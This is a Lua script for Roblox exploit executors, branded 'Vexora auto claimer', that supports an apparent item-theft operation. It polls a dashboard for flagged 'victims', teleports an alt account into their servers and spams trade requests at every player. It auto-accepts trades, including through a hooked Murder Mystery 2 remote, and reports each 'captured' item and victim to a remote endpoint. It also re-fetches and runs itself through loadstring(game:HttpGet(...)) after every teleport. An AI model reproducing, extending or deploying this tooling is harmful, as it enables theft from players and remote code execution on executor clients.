--[[ Vexora — auto claimer
  run this on the always-on alt. it polls the dashboard with your api key, and the
  moment a client flags a real victim it teleports into that server and starts trading.

  put it in your executor's autoexec folder (or use queue_on_teleport) so it comes
  back after every teleport.
]]

local CLAIMER_REV = "1.2"
local API_BASE = "{{API_BASE}}"
local API_KEY = "{{API_KEY}}"
local ENDPOINT = "{{ENDPOINT}}"
local SCRIPT_URL = "{{SCRIPT_URL}}"

local POLL_SECONDS = 3         -- seconds between target checks
local TRADE_DELAY = 2          -- seconds between trade attempts
local STAY_SECONDS = 240       -- how long to farm a server before chasing a new target
local AUTO_ACCEPT = true       -- accept incoming trade requests
local REPORT_ITEMS = true      -- post captured items to the dashboard

-- persisted across reloads by the executor
local settings = (getgenv and getgenv().VexoraClaimerSettings) or {}
if settings.autoExecute == nil then settings.autoExecute = true end
if settings.autoAccept == nil then settings.autoAccept = AUTO_ACCEPT end
settings.enabled = settings.autoExecute
if getgenv then getgenv().VexoraClaimerSettings = settings end

local ui = { state = "starting", polls = 0, target = nil, lastCapture = nil }

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local ME = LocalPlayer and LocalPlayer.Name or "unknown"
local HERE = game.JobId ~= "" and game.JobId or nil
local PLACE = game.PlaceId

local GAME_MAP = {
    [142823291] = "mm2",
    [920587237] = "adm",
    [126884695634066] = "gag2",
    [109983668079237] = "sab",
}
local GAME = GAME_MAP[PLACE] or GAME_MAP[game.GameId] or "baddies"

local httpRequest
if typeof(request) == "function" then
    httpRequest = request
elseif typeof(syn) == "table" and typeof(syn.request) == "function" then
    httpRequest = syn.request
elseif typeof(http_request) == "function" then
    httpRequest = http_request
elseif typeof(fluxus) == "table" and typeof(fluxus.request) == "function" then
    httpRequest = fluxus.request
end

if not httpRequest then
    warn("[vexora-claimer] no HTTP function in this executor")
    return nil
end

-- one claimer per client; a reload replaces the old loop instead of stacking it
local state = getgenv and getgenv().VexoraClaimer
if state and state.stop then pcall(state.stop) end
local running = true
local function stop()
    running = false
end
if getgenv then getgenv().VexoraClaimer = { stop = stop, rev = CLAIMER_REV } end

local function encode(value)
    return tostring(value or ""):gsub("[^%w%-%._~]", function(c)
        return string.format("%%%02X", string.byte(c))
    end)
end

local function http(method, url, body)
    local opts = {
        Url = url,
        Method = method,
        Headers = { ["x-api-key"] = API_KEY, ["Content-Type"] = "application/json" },
    }
    if body then opts.Body = HttpService:JSONEncode(body) end

    local ok, res = pcall(httpRequest, opts)
    if not ok then return nil, tostring(res) end

    local status = res and (res.StatusCode or res.status or res.Status)
    local raw = res and (res.Body or res.body)
    local decoded = nil
    if typeof(raw) == "string" and #raw > 0 then
        pcall(function() decoded = HttpService:JSONDecode(raw) end)
    end
    return { status = status, body = decoded, raw = raw }, nil
end

local function report(payload)
    if not REPORT_ITEMS then return end
    pcall(function() http("POST", ENDPOINT, payload) end)
end

-- lets the dashboard show whether the phone is actually reaching it
local function heartbeat(state, target, err)
    pcall(function()
        http("POST", API_BASE .. "/api/claimer/heartbeat", {
            account = ME,
            rev = CLAIMER_REV,
            server = HERE,
            state = state or "polling",
            target = target,
            error = err,
        })
    end)
end

--[[ ---- remote discovery ---- ]]
local function findRemotes(pattern)
    local out = {}
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and obj.Name:lower():match(pattern) then
            table.insert(out, obj)
        end
    end
    return out
end

local tradeRemotes = findRemotes("trade")
local acceptRemotes = findRemotes("accept")
for _, remote in ipairs(findRemotes("request")) do
    if not table.find(tradeRemotes, remote) then table.insert(acceptRemotes, remote) end
end

local function playerIn(args)
    for _, value in ipairs(args) do
        if typeof(value) == "Instance" and value:IsA("Player") then return value end
        if typeof(value) == "string" then
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr.Name == value then return plr end
            end
        end
    end
    return nil
end

local function itemIn(args, victim)
    for _, value in ipairs(args) do
        if typeof(value) == "string" and #value > 1
            and (not victim or value ~= victim.Name)
            and value:lower() ~= "accept" then
            return value
        end
    end
    return nil
end

local function capture(item, victim, value)
    report({
        game = GAME,
        item = tostring(item),
        victim = tostring(victim or "Unknown victim"),
        value = tonumber(value) or 1,
        place_id = PLACE,
        server_id = HERE,
        executor = "vexora-claimer",
        roblox_user = ME,
    })
    ui.lastCapture = tostring(item) .. " <- " .. tostring(victim or "?")
    print(string.format("[vexora-claimer] captured %s from %s", tostring(item), tostring(victim)))
end

--[[ ---- accept any incoming trade request ---- ]]
local MM2 = PLACE == 142823291

local function clickSignal(button)
    if not button then return end
    pcall(function() firesignal(button.Activated) end)
    pcall(function() firesignal(button.MouseButton1Click) end)
end

local MM2_ACCEPT_PATHS = {
    { "TradeGUI", "Container", "Trade", "Actions", "Accept", "Confirm", "ActionButton" },
    { "TradeGUI", "Container", "Trade", "Actions", "Accept", "ActionButton" },
    { "TradeGUI", "Container", "Trade", "Actions", "Accept", "Cooldown", "Blocker" },
    { "TradeGUI_Phone", "Container", "Trade", "Actions", "Accept", "Confirm", "ActionButton" },
    { "TradeGUI_Phone", "Container", "Trade", "Actions", "Accept", "ActionButton" },
    { "TradeGUI_Phone", "Container", "Trade", "Actions", "Accept", "Cooldown", "Blocker" },
    { "TradeGUI.Phone", "Container", "Trade", "Actions", "Accept", "Confirm", "ActionButton" },
    { "TradeGUI.Phone", "Container", "Trade", "Actions", "Accept", "ActionButton" },
}

local function mm2TradeRoot()
    if not MM2 then return nil end
    return ReplicatedStorage:FindFirstChild("Trade")
end

local function mm2Confirm()
    local trade = mm2TradeRoot()
    local accept = trade and trade:FindFirstChild("AcceptRequest")
    if accept then pcall(function() accept:FireServer() end) end

    local gui = LocalPlayer and LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if not gui then return end
    for _, path in ipairs(MM2_ACCEPT_PATHS) do
        local node = gui
        for _, name in ipairs(path) do
            node = node and node:FindFirstChild(name)
        end
        clickSignal(node)
    end
end

if MM2 then
    task.spawn(function()
        for _ = 1, 30 do
            local trade = mm2TradeRoot() or ReplicatedStorage:WaitForChild("Trade", 2)
            local sendRequest = trade and trade:FindFirstChild("SendRequest")
            if sendRequest then
                pcall(function()
                    sendRequest.OnClientInvoke = function()
                        task.spawn(function()
                            task.wait(0.4)
                            for _ = 1, 10 do
                                mm2Confirm()
                                task.wait(0.25)
                            end
                        end)
                        return true
                    end
                end)
                print("[vexora-claimer] mm2 SendRequest hook installed")
                return
            end
            task.wait(2)
        end
        print("[vexora-claimer] mm2 SendRequest hook not installed")
    end)
end

-- generic games: click accept on any incoming trade prompt, whoever sent it
local function findAcceptButton()
    local gui = LocalPlayer and LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if not gui then return nil end
    for _, obj in ipairs(gui:GetDescendants()) do
        if obj:IsA("TextButton") or obj:IsA("ImageButton") then
            local text = obj:IsA("TextButton") and tostring(obj.Text) or ""
            local label = (obj.Name .. " " .. text):lower()
            if label:find("accept", 1, true) or label:find("confirm", 1, true) then
                local node, context = obj, ""
                while node and node ~= gui do
                    context = context .. " " .. node.Name:lower()
                    node = node.Parent
                end
                if context:find("trade", 1, true) or context:find("request", 1, true) then
                    return obj
                end
            end
        end
    end
    return nil
end

task.spawn(function()
    while running do
        task.wait(1.5)
        if settings.autoAccept then
            local button = findAcceptButton()
            if button then
                clickSignal(button)
                print("[vexora-claimer] accepted an incoming trade request")
            end
        end
    end
end)

for _, remote in ipairs(acceptRemotes) do
    pcall(function()
        remote.OnClientEvent:Connect(function(...)
            local args = { ... }
            local victim = playerIn(args)
            if settings.autoAccept and victim then
                pcall(function() remote:FireServer("accept", victim) end)
                pcall(function() remote:FireServer(victim) end)
            end
            local item = itemIn(args, victim)
            if victim and item then capture(item, victim.Name) end
        end)
    end)
end

--[[ ---- trading ---- ]]
local trading = false
local arrivedAt = 0
local arrivedFor = nil
local seen = {}
local tradingLoop = nil

local function startTrading(target)
    if trading then return end
    trading = true
    arrivedAt = os.time()
    ui.state = "trading"
    ui.target = target or ui.target
    heartbeat("trading", target and target.server_id)
    print(string.format("[vexora-claimer] arrived in %s | target %s | %s trade remotes",
        tostring(HERE), tostring(target and target.item or "?"), tostring(#tradeRemotes)))

    if tradingLoop then return end
    tradingLoop = task.spawn(function()
        while running do
            local player = LocalPlayer
            if player and player.Character then
                if MM2 then
                    local trade = mm2TradeRoot()
                    local start = trade and trade:FindFirstChild("StartTrade")
                    if start then
                        for _, other in ipairs(Players:GetPlayers()) do
                            if other ~= player then
                                pcall(function() start:FireServer(other) end)
                            end
                        end
                    end
                    mm2Confirm()
                else
                    for _, remote in ipairs(tradeRemotes) do
                        for _, other in ipairs(Players:GetPlayers()) do
                            if other ~= player then
                                pcall(function() remote:FireServer(other) end)
                                pcall(function() remote:FireServer("trade", other) end)
                                pcall(function() remote:FireServer("request", other) end)
                            end
                        end
                    end
                end
            end
            task.wait(TRADE_DELAY)
        end
        trading = false
    end)
end

-- watch new tools too, in case the game hands items over silently
if LocalPlayer then
    task.spawn(function()
        local function watch(bag)
            bag.ChildAdded:Connect(function(child)
                if child:IsA("Tool") and not seen[child.Name] then
                    seen[child.Name] = true
                    capture(child.Name, "tool")
                end
            end)
        end
        local bag = LocalPlayer:FindFirstChildOfClass("Backpack")
        if bag then watch(bag) end
        LocalPlayer.ChildAdded:Connect(function(child)
            if child.Name == "Backpack" then task.wait(0.5); watch(child) end
        end)
    end)
end

--[[ ---- teleport ---- ]]
local function raiseIdentity()
    if typeof(setthreadidentity) == "function" then pcall(setthreadidentity, 8) end
    if typeof(setidentity) == "function" then pcall(setidentity, 8) end
    if typeof(syn) == "table" and typeof(syn.set_thread_identity) == "function" then
        pcall(syn.set_thread_identity, 8)
    end
end

local function queueSelf()
    local line = 'loadstring(game:HttpGet("' .. SCRIPT_URL .. '"))()'
    if typeof(queue_on_teleport) == "function" then
        pcall(queue_on_teleport, line)
    elseif typeof(queueonteleport) == "function" then
        pcall(queueonteleport, line)
    elseif typeof(syn) == "table" and typeof(syn.queue_on_teleport) == "function" then
        pcall(syn.queue_on_teleport, line)
    end
end

local function joinTarget(target)
    if not target or not target.place_id or not target.server_id then return false end
    raiseIdentity()
    queueSelf()
    ui.state = "joining"
    heartbeat("joining", target.server_id)

    local teleport = game:GetService("TeleportService")
    local placeId = tonumber(target.place_id)
    local attempts = {
        function() teleport:TeleportToPlaceInstance(placeId, target.server_id, LocalPlayer) end,
        function() teleport:TeleportToPlaceInstance(placeId, target.server_id) end,
        function() teleport:Teleport(placeId, LocalPlayer) end,
    }

    for index, attempt in ipairs(attempts) do
        local ok, err = pcall(attempt)
        print(string.format("[vexora-claimer] teleport %d/%d -> %s", index, #attempts,
            ok and ("joining " .. tostring(target.server_id)) or tostring(err)))
        if ok then return true end
        task.wait(1)
    end

    print("[vexora-claimer] teleport refused - the dashboard lease expires in 90s and retries")
    return false
end

--[[ ---- poll loop ---- ]]
local function getTarget()
    -- once the stay timer is up, ask for a different server while still farming this one
    local move = (trading and (os.time() - arrivedAt) >= STAY_SECONDS) and "&move=1" or ""
    local res, err = http("GET", API_BASE .. "/api/claimer/target?account=" .. encode(ME)
        .. "&server=" .. encode(HERE) .. move)
    ui.polls = ui.polls + 1
    if not res then
        ui.state = "offline"
        ui.error = tostring(err)
        print("[vexora-claimer] poll failed: " .. tostring(err))
        return nil
    end
    if res.status == 401 then
        print("[vexora-claimer] api key rejected - regenerate it on the dashboard")
        return nil
    end
    if res.status ~= 200 or type(res.body) ~= "table" then
        print("[vexora-claimer] poll http " .. tostring(res.status))
        return nil
    end
    local body = res.body
    ui.error = nil
    if body.target then ui.target = body.target end
    ui.state = body.paused and "paused" or (body.target and "target" or "polling")
    if body.paused then
        heartbeat("paused")
    elseif body.target then
        heartbeat("target", body.target.server_id)
    else
        heartbeat("polling")
    end
    return body
end

--[[ ---- in-game menu ---- ]]
local uiApi = {}

local function buildUi()
    local playerGui = LocalPlayer and LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if not playerGui then return end

    local old = playerGui:FindFirstChild("VexoraClaimerUI")
    if old then old:Destroy() end

    local screen = Instance.new("ScreenGui")
    screen.Name = "VexoraClaimerUI"
    screen.ResetOnSpawn = false
    screen.IgnoreGuiInset = true
    screen.DisplayOrder = 9999
    screen.Parent = playerGui

    local function new(class, props, parent)
        local obj = Instance.new(class)
        for key, value in pairs(props) do pcall(function() obj[key] = value end) end
        obj.Parent = parent
        return obj
    end

    local function round(obj, radius)
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, radius or 8)
        corner.Parent = obj
    end

    local bg = Color3.fromRGB(15, 15, 21)
    local card = Color3.fromRGB(27, 27, 37)
    local ink = Color3.fromRGB(236, 236, 246)
    local dim = Color3.fromRGB(148, 148, 170)
    local accent = Color3.fromRGB(139, 92, 246)
    local on = Color3.fromRGB(34, 197, 94)
    local off = Color3.fromRGB(239, 68, 68)

    local float = new("TextButton", {
        Name = "Open", Size = UDim2.fromOffset(44, 30), Position = UDim2.fromOffset(16, 16),
        BackgroundColor3 = accent, Text = "V", TextSize = 16, Font = Enum.Font.GothamBold,
        TextColor3 = Color3.new(1, 1, 1), AutoButtonColor = false,
    }, screen)
    round(float, 8)

    local frame = new("Frame", {
        Name = "Window", Size = UDim2.fromOffset(318, 288), Position = UDim2.fromOffset(16, 54),
        BackgroundColor3 = bg, BorderSizePixel = 0,
    }, screen)
    round(frame, 12)

    local header = new("Frame", {
        Size = UDim2.new(1, 0, 0, 38), BackgroundColor3 = Color3.fromRGB(23, 23, 32),
        BorderSizePixel = 0,
    }, frame)
    round(header, 12)

    new("TextLabel", {
        BackgroundTransparency = 1, Position = UDim2.fromOffset(12, 9), Size = UDim2.new(1, -48, 0, 20),
        Font = Enum.Font.GothamBold, TextSize = 13, TextXAlignment = Enum.TextXAlignment.Left,
        TextColor3 = ink, Text = "VEXORA CLAIMER  ·  " .. CLAIMER_REV,
    }, header)

    local close = new("TextButton", {
        Size = UDim2.fromOffset(26, 26), Position = UDim2.new(1, -34, 0, 6),
        BackgroundColor3 = Color3.fromRGB(41, 41, 54), Text = "x", TextSize = 13,
        Font = Enum.Font.GothamBold, TextColor3 = ink, AutoButtonColor = false,
    }, header)
    round(close, 7)

    local content = new("Frame", {
        Position = UDim2.fromOffset(0, 40), Size = UDim2.new(1, 0, 1, -40), BackgroundTransparency = 1,
    }, frame)

    local stateLabel = new("TextLabel", {
        BackgroundTransparency = 1, Position = UDim2.fromOffset(14, 6), Size = UDim2.new(1, -28, 0, 16),
        Font = Enum.Font.GothamBold, TextSize = 12, TextXAlignment = Enum.TextXAlignment.Left,
        TextColor3 = ink, Text = "starting",
    }, content)

    local targetLabel = new("TextLabel", {
        BackgroundTransparency = 1, Position = UDim2.fromOffset(14, 24), Size = UDim2.new(1, -28, 0, 16),
        Font = Enum.Font.Code, TextSize = 11, TextXAlignment = Enum.TextXAlignment.Left,
        TextColor3 = dim, Text = "no target yet",
    }, content)

    local captureLabel = new("TextLabel", {
        BackgroundTransparency = 1, Position = UDim2.fromOffset(14, 42), Size = UDim2.new(1, -28, 0, 16),
        Font = Enum.Font.Code, TextSize = 11, TextXAlignment = Enum.TextXAlignment.Left,
        TextColor3 = dim, Text = "polls: 0",
    }, content)

    local function toggleRow(textValue, y, isOn, onChange)
        local row = new("Frame", {
            Position = UDim2.fromOffset(14, y), Size = UDim2.new(1, -28, 0, 28),
            BackgroundColor3 = card, BorderSizePixel = 0,
        }, content)
        round(row, 8)
        new("TextLabel", {
            BackgroundTransparency = 1, Position = UDim2.fromOffset(10, 5),
            Size = UDim2.new(1, -66, 0, 18), Font = Enum.Font.Gotham, TextSize = 11,
            TextXAlignment = Enum.TextXAlignment.Left, TextColor3 = ink, Text = textValue,
        }, row)
        local pill = new("TextButton", {
            Position = UDim2.new(1, -56, 0, 4), Size = UDim2.fromOffset(46, 20),
            BackgroundColor3 = isOn and on or off, Text = isOn and "ON" or "OFF",
            TextSize = 10, Font = Enum.Font.GothamBold, TextColor3 = Color3.new(1, 1, 1),
            AutoButtonColor = false,
        }, row)
        round(pill, 6)
        pill.MouseButton1Click:Connect(function()
            isOn = not isOn
            pill.Text = isOn and "ON" or "OFF"
            pill.BackgroundColor3 = isOn and on or off
            onChange(isOn)
        end)
    end

    toggleRow("Auto claimer", 66, settings.enabled, function(value)
        settings.enabled = value
        ui.state = value and "polling" or "off"
        if uiApi.update then uiApi.update() end
    end)
    toggleRow("Auto execute on load", 98, settings.autoExecute, function(value)
        settings.autoExecute = value
    end)
    toggleRow("Auto accept trades", 130, settings.autoAccept, function(value)
        settings.autoAccept = value
        AUTO_ACCEPT = value
    end)

    local poll = new("TextButton", {
        Position = UDim2.fromOffset(14, 168), Size = UDim2.new(1, -28, 0, 28),
        BackgroundColor3 = accent, Text = "Poll dashboard now", TextSize = 12,
        Font = Enum.Font.GothamBold, TextColor3 = Color3.new(1, 1, 1), AutoButtonColor = false,
    }, content)
    round(poll, 8)
    poll.MouseButton1Click:Connect(function()
        task.spawn(function()
            getTarget()
            if uiApi.update then uiApi.update() end
        end)
    end)

    local footer = new("TextLabel", {
        BackgroundTransparency = 1, Position = UDim2.fromOffset(14, 202), Size = UDim2.new(1, -28, 0, 28),
        Font = Enum.Font.Code, TextSize = 10, TextXAlignment = Enum.TextXAlignment.Left,
        TextWrapped = true, TextColor3 = dim, Text = "api " .. API_BASE,
    }, content)

    local function setOpen(open)
        frame.Visible = open
        float.Visible = not open
    end
    close.MouseButton1Click:Connect(function() setOpen(false) end)
    float.MouseButton1Click:Connect(function() setOpen(true) end)

    local dragging, dragStart, startPos = false, nil, nil
    header.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
            or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + delta.X,
                startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)

    uiApi.update = function()
        if not frame.Parent then return end
        stateLabel.Text = string.format("%s  ·  %s", tostring(ui.state), ME)
        stateLabel.TextColor3 = (ui.state == "offline" or ui.state == "off") and off or ink
        local target = ui.target
        targetLabel.Text = target
            and string.format("%s  (%s)  %s", tostring(target.item or "?"),
                tostring(target.value or "?"), tostring(target.server_id or ""):sub(1, 10))
            or "no target yet"
        captureLabel.Text = ui.error and ("error: " .. tostring(ui.error):sub(1, 46))
            or (ui.lastCapture and ("captured: " .. ui.lastCapture)
            or ("polls: " .. tostring(ui.polls) .. "  ·  " .. GAME))
        footer.Text = "api " .. API_BASE
    end

    setOpen(true)
end

pcall(buildUi)

print(string.format("[vexora-claimer] rev %s | %s | game=%s | server=%s | api=%s",
    CLAIMER_REV, ME, GAME, tostring(HERE), API_BASE))
print(string.format("[vexora-claimer] trading=%s poll=%ds stay=%ds remotes=%d/%d",
    tostring(trading), POLL_SECONDS, STAY_SECONDS, #tradeRemotes, #acceptRemotes))
heartbeat("starting")
if uiApi.update then pcall(uiApi.update) end

task.spawn(function()
    while running do
        local payload = settings.enabled and getTarget() or nil
        if not settings.enabled then ui.state = "off" end
        if payload then
            if payload.paused then
                -- claimer is disarmed on the dashboard
            elseif payload.target then
                local target = payload.target
                if target.server_id == HERE then
                    startTrading(target)
                    if arrivedFor ~= target.id then
                        arrivedFor = target.id
                        pcall(function()
                            http("POST", API_BASE .. "/api/claimer/target/" .. encode(target.id) .. "/arrived",
                                { server_id = HERE, account = ME })
                        end)
                    end
                elseif not trading or (os.time() - arrivedAt) >= STAY_SECONDS then
                    if joinTarget(target) then
                        return
                    end
                end
            end
        end
        if uiApi.update then pcall(uiApi.update) end
        task.wait(POLL_SECONDS)
    end
end)

return {
    rev = CLAIMER_REV,
    stop = stop,
    join = joinTarget,
    target = getTarget,
    ui = uiApi,
    settings = settings,
}
